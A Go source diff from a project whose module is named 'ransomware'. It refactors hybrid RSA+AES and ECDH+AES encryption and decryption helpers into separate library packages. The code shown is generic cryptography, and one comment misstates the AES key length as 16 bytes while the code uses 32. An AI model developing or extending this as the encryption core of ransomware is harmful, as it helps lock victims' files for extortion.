@@ -1,11 +1,13 @@
-package enc
+package encryption
 
 import (
 	"crypto/ecdsa"
 	"crypto/elliptic"
 	"crypto/rand"
 	"crypto/rsa"
-	"ransomware/ecc"
+	"ransomware/encryption/aesLib"
+	"ransomware/encryption/eccLib"
+	"ransomware/encryption/rsaLib"
 )
 
 // Generates random 16 byte AES key and encrypts message with it, encrypts the AES key
@@ -15,11 +17,11 @@ func RSAAESEncrypt(msg []byte, publicKey *rsa.PublicKey) ([]byte, error) {
 	aesKey := make([]byte, 32)
 	rand.Read(aesKey)
 
-	encrypted, err := EncryptAES(msg, aesKey)
+	encrypted, err := aesLib.EncryptAES(msg, aesKey)
 	if err != nil {
 		return nil, err
 	}
-	aesKeyEncrypted, err := EncryptRSA(aesKey, publicKey)
+	aesKeyEncrypted, err := rsaLib.EncryptRSA(aesKey, publicKey)
 	if err != nil {
 		return nil, err
 	}
@@ -34,9 +36,9 @@ func RSAAESDecrypt(msg []byte, privateKey *rsa.PrivateKey) []byte {
 
 	aesKeyEncrypted, encryptedMessage := msg[:256], msg[256:]
 
-	aesKey := DecryptRSA(aesKeyEncrypted, privateKey)
+	aesKey := rsaLib.DecryptRSA(aesKeyEncrypted, privateKey)
 
-	decrypted, err := DecryptAES(encryptedMessage, aesKey)
+	decrypted, err := aesLib.DecryptAES(encryptedMessage, aesKey)
 	if err != nil {
 		return msg
 	}
@@ -46,14 +48,14 @@ func RSAAESDecrypt(msg []byte, privateKey *rsa.PrivateKey) []byte {
 
 func ECDHAESEncrypt(msg []byte, publicKey *ecdsa.PublicKey) ([]byte, error) {
 
-	aesKey, cipherPublicKey, err := ecc.ECDHGenerateEncryptionKey(publicKey)
+	aesKey, cipherPublicKey, err := eccLib.ECDHGenerateEncryptionKey(publicKey)
 	if err != nil {
 		return nil, err
 	}
 
-	cipherPublicMarshal := elliptic.MarshalCompressed(ecc.Curve, cipherPublicKey.X, cipherPublicKey.Y)
+	cipherPublicMarshal := elliptic.MarshalCompressed(eccLib.Curve, cipherPublicKey.X, cipherPublicKey.Y)
 
-	encrypted, err := EncryptAES(msg, aesKey)
+	encrypted, err := aesLib.EncryptAES(msg, aesKey)
 	if err != nil {
 		return nil, err
 	}
@@ -67,13 +69,13 @@ func ECDHAESDecrypt(msg []byte, privateKey *ecdsa.PrivateKey) []byte {
 
 	cipherPublicMarshal, encryptedMessage := msg[:33], msg[33:]
 
-	x, y := elliptic.UnmarshalCompressed(ecc.Curve, cipherPublicMarshal)
+	x, y := elliptic.UnmarshalCompressed(eccLib.Curve, cipherPublicMarshal)
 
-	cipherPublicKey := &ecdsa.PublicKey{Curve: ecc.Curve, X: x, Y: y}
+	cipherPublicKey := &ecdsa.PublicKey{Curve: eccLib.Curve, X: x, Y: y}
 
-	aesKey := ecc.ECDHGenerateDecryptionKey(privateKey, cipherPublicKey)
+	aesKey := eccLib.ECDHGenerateDecryptionKey(privateKey, cipherPublicKey)
 
-	decrypted, err := DecryptAES(encryptedMessage, aesKey)
+	decrypted, err := aesLib.DecryptAES(encryptedMessage, aesKey)
 	if err != nil {
 		return msg
 	}
